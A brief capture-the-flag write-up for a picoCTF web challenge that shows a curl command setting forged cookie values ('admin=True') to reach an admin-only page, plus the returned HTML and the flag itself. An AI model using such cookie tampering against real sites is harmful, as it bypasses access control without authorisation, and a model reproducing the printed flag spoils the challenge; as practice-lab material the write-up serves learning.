This is a web exploitation challenge that can be easily exploited by changing the cookie value.

One way of doing this would be by using the following commands,:
```
curl "https://jupiter.challenges.picoctf.org/problem/64751/flag" -H "Cookie: time=1400; admin=True;" -s | grep picoCTF
```

Such a command uses `curl` to change the values of the cookie and the following output will be obtained:
```
<p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{0p3n_t0_adm1n5_132f8585}</code></p>
```

The flag is : `picoCTF{0p3n_t0_adm1n5_132f8585}`